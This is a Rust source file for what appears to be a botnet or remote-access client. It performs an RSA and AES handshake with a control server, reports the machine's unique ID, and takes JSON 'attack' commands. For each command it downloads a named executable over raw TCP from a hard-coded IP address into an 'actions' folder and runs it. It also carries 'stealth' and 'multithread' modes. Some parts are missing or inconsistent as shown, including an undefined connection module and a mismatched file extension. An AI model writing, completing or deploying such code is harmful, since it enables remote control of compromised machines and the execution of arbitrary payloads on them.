use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::str;
use std::sync::mpsc;
use std::thread;

use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use base64::{engine::general_purpose, Engine as _};
use generic_array::GenericArray;
use rand::rngs::OsRng;
use rsa::{pkcs8::LineEnding, Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};
use serde::{Deserialize, Serialize};

type Aes128CbcEnc = cbc::Encryptor<aes::Aes128>;
type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

#[derive(Serialize, Deserialize, Debug)]
struct DataReceived {
    id: String,
    attack: String,
    arg1: String,
    arg2: String,
    arg3: String,
}

fn receive_data_json_to_str(data: String) -> Result<DataReceived, serde_json::Error> {
    match serde_json::from_str::<DataReceived>(&data) {
        Ok(data) => Ok(data),
        Err(err) => {
            eprintln!("Error parsing JSON data: {:?}", err);
            Err(err)
        }
    }
}

fn try_convert_to_utf8(data: &[u8]) -> Result<String, std::str::Utf8Error> {
    str::from_utf8(data).map(|s| s.to_string())
}

fn receive_encrypted_data_from_server(
    receiver: &mpsc::Receiver<Vec<u8>>,
    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
) -> String {
    match receiver.recv() {
        Ok(data) => {
            println!("Data received successfully!");

            let mut bufff = [0u8; 128];
            let decrypted_data = Aes128CbcDec::new(&symetric_key, &iv)
                .decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut bufff)
                .unwrap_or_default();

            match try_convert_to_utf8(&decrypted_data) {
                Ok(utf8_data) => utf8_data,
                Err(err) => {
                    eprintln!("Error converting data to UTF-8: {:?}", err);
                    String::new()
                }
            }
        }
        Err(err) => {
            eprintln!("Error while receiving data: {:?}", err);
            String::new()
        }
    }
}

fn send_encrypted_data_to_server(
    sender: mpsc::Sender<Vec<u8>>,
    data: String,
    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
) {
    let data_as_bytes = data.as_bytes().to_vec();
    let mut bufff = [0u8; 128];
    let encrypted_data = Aes128CbcEnc::new(&symetric_key, &iv)
        .encrypt_padded_b2b_mut::<Pkcs7>(&data_as_bytes, &mut bufff)
        .unwrap();

    match sender.send(encrypted_data.to_vec()) {
        Ok(()) => {
            println!("Data sent successfully!");
        }
        Err(err) => {
            eprintln!("Error sending data: {}", err);
        }
    }
}

fn check_and_request_executable(
    executable_name: &str,
    executable_dir: &str,
    sender: &mpsc::Sender<Vec<u8>>,
    symetric_key: &GenericArray<u8, typenum::consts::U16>,
    iv: &GenericArray<u8, typenum::consts::U16>,
) -> std::io::Result<()> {
    let executable_path = std::path::Path::new(executable_dir).join(executable_name).with_extension("sh");

    if !executable_path.exists() {
        println!("Executable not found, requesting from server...");

        let request_message = format!("REQUEST_EXECUTABLE {}", executable_name);
        send_encrypted_data_to_server(sender.clone(), request_message, symetric_key.clone(), iv.clone());

        let mut buffer = [0u8; 1024];
        let mut file = std::fs::File::create(&executable_path)?;

        let mut stream = std::net::TcpStream::connect("51.77.193.65:4242")?;

        loop {
            let bytes_read = stream.read(&mut buffer)?;
            if bytes_read == 0 {
                break;
            }
            file.write_all(&buffer[..bytes_read])?;
        }

        println!("Executable received and stored at {:?}", executable_path);
    } else {
        send_encrypted_data_to_server(sender.clone(), "YES".to_string(), symetric_key.clone(), iv.clone());
    }

    Ok(())
}

fn execute_attack(
    attack_name: &str,
    sender: &mpsc::Sender<Vec<u8>>,
    symetric_key: &GenericArray<u8, typenum::consts::U16>,
    iv: &GenericArray<u8, typenum::consts::U16>,
) -> std::io::Result<()> {
    let executable_dir = "./actions";

    check_and_request_executable(attack_name, executable_dir, sender, symetric_key, iv)?;

    let executable_path = std::path::Path::new(executable_dir).join(attack_name);
    std::process::Command::new(executable_path).spawn()?.wait()?;

    Ok(())
}

fn main() -> std::io::Result<()> {
    let connexion: TcpStream = connexion::connexion()?;
    let connexion2: TcpStream = connexion.try_clone()?;

    let (sender, rx) = mpsc::channel::<Vec<u8>>();
    let sender_clone = sender.clone();
    let _thread_emission = thread::spawn(move || {
        connexion::emission(connexion, rx);
    });

    let (tx2, receiver) = mpsc::channel::<Vec<u8>>();
    let _thread_reception = thread::spawn(move || {
        connexion::reception(connexion2, tx2);
    });

    let mut rng = OsRng;
    let bits = 2048;
    let private_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
    let public_key = RsaPublicKey::from(&private_key);

    let pkcs1_encoded_public_pem = public_key.to_public_key_pem(LineEnding::LF).unwrap();

    sender.send(pkcs1_encoded_public_pem.as_bytes().to_vec()).unwrap();

    let encrypted_hanshake_data = receiver.recv().unwrap();

    let decrypted_data = private_key.decrypt(Pkcs1v15Encrypt, &encrypted_hanshake_data).unwrap();

    let handshake_data: HandshakeConfJson = serde_json::from_str(str::from_utf8(&decrypted_data).unwrap()).unwrap();

    let _stealth_mode = handshake_data.stealth;
    let _multithread_mode = handshake_data.multithread;

    let symetric_key = GenericArray::clone_from_slice(&general_purpose::STANDARD.decode(handshake_data.b64symetric.as_bytes()).unwrap());
    let iv = GenericArray::clone_from_slice(&general_purpose::STANDARD.decode(handshake_data.b64iv.as_bytes()).unwrap());

    let uid = machine_uid::get().unwrap();

    let handshake_response = format!("{{\"action\":\"client_config\",\"uid\":\"{}\"}}", uid);

    send_encrypted_data_to_server(sender.clone(), handshake_response, symetric_key.clone(), iv.clone());

    let thread_test = thread::spawn(move || {
        loop {
            let message = receive_encrypted_data_from_server(&receiver, symetric_key.clone(), iv.clone());
            if let Ok(json_message) = receive_data_json_to_str(message.clone()) {
                println!("Type d'attaque : {:?}", json_message.attack);
                if !message.is_empty() {
                    println!("Received command: {}", message);
                    match execute_attack(&json_message.attack, &sender, &symetric_key, &iv) {
                        Ok(_) => {
                            let response = format!("{{\"status\":\"success\",\"action\":\"{}\"}}", json_message.attack);
                            send_encrypted_data_to_server(sender.clone(), response, symetric_key.clone(), iv.clone());
                        }
                        Err(e) => {
                            let response = format!("{{\"status\":\"error\",\"action\":\"{}\",\"error\":\"{}\"}}", json_message.attack, e);
                            send_encrypted_data_to_server(sender.clone(), response, symetric_key.clone(), iv.clone());
                        }
                    }
                }
            }
        }
    });

    loop {
        let mut input = String::new();
        println!("Entrez un message : ");
        match io::stdin().read_line(&mut input) {
            Ok(_) => {
                println!("{}", input);
                send_encrypted_data_to_server(sender_clone.clone(), input, symetric_key.clone(), iv.clone());
            }
            Err(error) => println!("error: {}", error),
        }
    }
}
